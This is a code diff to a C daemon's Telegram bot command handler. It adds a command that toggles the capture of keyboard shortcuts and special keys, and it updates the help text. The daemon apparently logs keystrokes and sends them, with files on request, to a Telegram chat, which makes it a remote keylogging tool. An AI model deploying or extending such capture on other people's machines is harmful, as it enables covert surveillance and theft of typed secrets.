@@ -397,23 +397,60 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                 }
             }
         }
+    } else if (match_command(text, "keyboard_shortcuts") || match_command(text, "keyboard_shortcut") ||
+               match_command(text, "shortcuts") || match_command(text, "shortcut")) {
+        if (config->disable_keyboard) {
+            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
+        } else {
+            const char *arg = get_command_argument(text);
+            if (arg && *arg) {
+                while (isspace((unsigned char)*arg)) arg++;
+                if (strcasecmp(arg, "on") == 0 || strcasecmp(arg, "1") == 0 || strcasecmp(arg, "enable") == 0 || strcasecmp(arg, "start") == 0) {
+                    keyboard_set_shortcuts_enabled(1);
+                    telegram_send_html("⌨️ <b>Keyboard Shortcuts Capture:</b> 🟢 <b>ENABLED</b>\n<i>Modifier shortcuts ([Ctrl+C], [Alt+Tab], etc.) and special keys will now be captured.</i>");
+                } else if (strcasecmp(arg, "off") == 0 || strcasecmp(arg, "0") == 0 || strcasecmp(arg, "disable") == 0 || strcasecmp(arg, "stop") == 0) {
+                    keyboard_set_shortcuts_enabled(0);
+                    telegram_send_html("⌨️ <b>Keyboard Shortcuts Capture:</b> ⚪ <b>DISABLED</b>\n<i>Clean typing text mode active: modifier tags and special key tags are suppressed.</i>");
+                } else if (strcasecmp(arg, "toggle") == 0) {
+                    int s = keyboard_toggle_shortcuts();
+                    char resp[256];
+                    snprintf(resp, sizeof(resp),
+                             "⌨️ <b>Keyboard Shortcuts Capture:</b> %s",
+                             s ? "🟢 <b>ENABLED</b> (Capturing shortcuts)" : "⚪ <b>DISABLED</b> (Clean typing text only)");
+                    telegram_send_html(resp);
+                } else {
+                    telegram_send_html("⚠️ <b>Usage:</b> <code>/keyboard_shortcuts &lt;on|off|toggle&gt;</code>");
+                }
+            } else {
+                int s = keyboard_get_shortcuts_enabled();
+                char resp[512];
+                snprintf(resp, sizeof(resp),
+                         "⌨️ <b>Keyboard Shortcuts Capture:</b> %s\n\n"
+                         "• <code>/keyboard_shortcuts on</code> - Capture [Ctrl+C], [Alt+Tab], and special keys\n"
+                         "• <code>/keyboard_shortcuts off</code> - Clean typing text only (suppress tags)\n"
+                         "• <code>/keyboard_shortcuts toggle</code> - Toggle state",
+                         s ? "🟢 <b>ENABLED</b>" : "⚪ <b>DISABLED (Default)</b>");
+                telegram_send_html(resp);
+            }
+        }
     } else if (match_command(text, "keyboard_help")) {
         if (config->disable_keyboard) {
             telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
         } else {
-            char kb_help[1024];
+            char kb_help[1200];
             snprintf(kb_help, sizeof(kb_help),
                      "⌨️ <b>Keyboard Control Commands</b>\n\n"
                      "• <code>/keyboard_list</code> - View detected keyboard devices &amp; status\n"
                      "• <code>/keyboard_select &lt;id|all&gt;</code> - Filter capture to a specific keyboard\n"
                      "• <code>/keyboard_layout [code]</code> - View or change keyboard layout\n"
+                     "• <code>/keyboard_shortcuts &lt;on|off|toggle&gt;</code> - Enable/disable shortcuts &amp; special keys\n"
                      "• <code>/keyboard_on</code> - Enable keyboard capturing\n"
                      "• <code>/keyboard_off</code> - Pause keyboard capturing\n"
                      "• <code>/keyboard_toggle</code> - Toggle active / paused state\n"
                      "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Change output formatting\n"
                      "• <code>/keyboard_flush</code> - Flush buffered keys to Telegram immediately\n"
                      "• <code>/keyboard_status</code> - View keyboard monitor state &amp; buffer status\n\n"
-                     "💡 <i>Tip: Commands also accept dash syntax (e.g. <code>/keyboard-layout it</code>)</i>");
+                     "💡 <i>Tip: Commands also accept dash syntax (e.g. <code>/keyboard-shortcuts off</code>)</i>");
             telegram_send_html(kb_help);
         }
     } else if (match_command(text, "getfile") || match_command(text, "file") ||
@@ -584,6 +621,7 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                                          "• <code>/keyboard_list</code> - View detected keyboard devices\n"
                                          "• <code>/keyboard_select &lt;id|all&gt;</code> - Select active keyboard target\n"
                                          "• <code>/keyboard_layout [code]</code> - View or change keyboard layout\n"
+                                         "• <code>/keyboard_shortcuts &lt;on|off|toggle&gt;</code> - Toggle shortcuts capture\n"
                                          "• <code>/keyboard_on</code> / <code>/keyboard_off</code> - Enable / mute keyboard\n"
                                          "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Set code block or raw mode\n"
                                          "• <code>/keyboard_status</code> - View detailed keyboard monitor state\n"
